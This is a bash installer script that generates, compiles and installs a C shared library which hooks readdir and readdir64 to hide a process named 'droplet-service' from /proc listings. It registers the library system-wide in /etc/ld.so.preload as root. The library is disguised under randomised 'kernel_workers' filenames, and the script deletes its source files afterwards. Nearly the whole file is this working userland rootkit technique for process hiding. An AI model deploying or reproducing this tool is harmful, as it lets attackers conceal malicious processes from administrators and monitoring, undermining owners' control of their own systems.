#!/bin/bash
set -e  

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

print_status() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This script needs to be run as root for installation steps."
        print_error "Please run: sudo $0"
        exit 1
    fi
}

generate_random_names() {
    RANDOM_SUFFIX=$(head /dev/urandom | tr -dc a-z | head -c $((8 + RANDOM % 5)))
    
    C_FILENAME="kernel_workers_${RANDOM_SUFFIX}.c"
    
    LIB_FILENAME="libkernel_workers_${RANDOM_SUFFIX}.so"
    
    print_status "Generated random C filename: $C_FILENAME"
    print_status "Generated random library name: $LIB_FILENAME"
}

get_process_name() {
    echo ""
    echo "This script will create a library that hides a specific process from /proc listings."
    echo ""
    PROCESS_NAME="droplet-service"
    
    print_status "Will filter process: $PROCESS_NAME"
}

create_c_file() {
    print_status "Creating $C_FILENAME..."
    
    cat > $C_FILENAME << EOF
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "$PROCESS_NAME";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \\
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \\
                                                                        \\
struct dirent* readdir(DIR *dirp)                                       \\
{                                                                       \\
    if(original_##readdir == NULL) {                                    \\
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \\
        if(original_##readdir == NULL)                                  \\
        {                                                               \\
            fprintf(stderr, "Error in dlsym: %s\\n", dlerror());         \\
        }                                                               \\
    }                                                                   \\
                                                                        \\
    struct dirent* dir;                                                 \\
                                                                        \\
    while(1)                                                            \\
    {                                                                   \\
        dir = original_##readdir(dirp);                                 \\
        if(dir) {                                                       \\
            char dir_name[256];                                         \\
            char process_name[256];                                     \\
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \\
                strcmp(dir_name, "/proc") == 0 &&                       \\
                get_process_name(dir->d_name, process_name) &&          \\
                strcmp(process_name, process_to_filter) == 0) {         \\
                continue;                                               \\
            }                                                           \\
        }                                                               \\
        break;                                                          \\
    }                                                                   \\
    return dir;                                                         \\
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
EOF

    print_status "Created $C_FILENAME with process filter: $PROCESS_NAME"
}

create_makefile() {
    print_status "Creating Makefile..."
    
    cat > Makefile << EOF
all: $LIB_FILENAME

$LIB_FILENAME: $C_FILENAME
	gcc -Wall -fPIC -shared -o $LIB_FILENAME $C_FILENAME -ldl

.PHONY: clean
clean:
	rm -f $LIB_FILENAME
EOF

    print_status "Created Makefile"
}

compile_library() {
    print_status "Compiling the shared library..."
    
    if ! command -v gcc &> /dev/null; then
        print_error "gcc is not installed. Please install gcc first."
        print_error "On Ubuntu/Debian: sudo apt-get install gcc"
        print_error "On CentOS/RHEL: sudo yum install gcc"
        exit 1
    fi
    
    make
    
    if [[ ! -f "$LIB_FILENAME" ]]; then
        print_error "Compilation failed - $LIB_FILENAME not created"
        exit 1
    fi
    
    print_status "Successfully compiled $LIB_FILENAME"
}

install_library() {
    print_status "Installing the library to /usr/local/lib/..."
    
    mkdir -p /usr/local/lib/
    
    # Get absolute paths to avoid same file error
    SOURCE_PATH=$(realpath "$LIB_FILENAME")
    DEST_PATH="/usr/local/lib/$LIB_FILENAME"
    
    # Check if source and destination are the same file
    if [[ "$SOURCE_PATH" == "$DEST_PATH" ]]; then
        print_warning "Library is already in the target location: $DEST_PATH"
    else
        # Remove existing file if it exists
        if [[ -f "$DEST_PATH" ]]; then
            print_warning "Removing existing library: $DEST_PATH"
            rm -f "$DEST_PATH"
        fi
        
        cp "$LIB_FILENAME" /usr/local/lib/
        print_status "Library copied to /usr/local/lib/$LIB_FILENAME"
    fi
    
    chmod 755 /usr/local/lib/$LIB_FILENAME
    print_status "Library installed to /usr/local/lib/$LIB_FILENAME"
}

configure_preload() {
    print_status "Configuring ld.so.preload..."
    
    if grep -q "$LIB_FILENAME" /etc/ld.so.preload 2>/dev/null; then
        print_warning "$LIB_FILENAME already exists in /etc/ld.so.preload"
        read -p "Do you want to continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            print_status "Skipping ld.so.preload configuration"
            return
        fi
    fi
    
    echo "/usr/local/lib/$LIB_FILENAME" >> /etc/ld.so.preload
    
    print_status "Added library to /etc/ld.so.preload"
}

cleanup() {
    print_status "Cleaning up temporary files..."
    rm -f $C_FILENAME Makefile $LIB_FILENAME
}

# Main execution
main() {
    echo "=============================================="
    echo "    Kernel Workers Library Installer"
    echo "=============================================="
    
    # Check if running as root
    check_root
        rm -f $C_FILENAME Makefile $LIB_FILENAME

    # Generate random filenames
    generate_random_names
    
    # Get process name from user
    get_process_name
    
    # Create files
    create_c_file
    create_makefile
    
    # Compile
    compile_library
    
    # Install
    install_library
    configure_preload
    
    # Cleanup
    cleanup
    
    echo ""
    print_status "Installation completed successfully!"
    print_warning "The library is now active and will filter '$PROCESS_NAME' processes from /proc listings."
    print_warning "To remove the filter, edit /etc/ld.so.preload and remove the $LIB_FILENAME line."
    echo ""
    echo "To test the filter, try:"
    echo "  ls /proc | grep [0-9] | head -10"
    echo ""
}

# Handle script interruption
trap 'print_error "Installation interrupted"; cleanup; exit 1' INT TERM

# Run main function
main "$@"
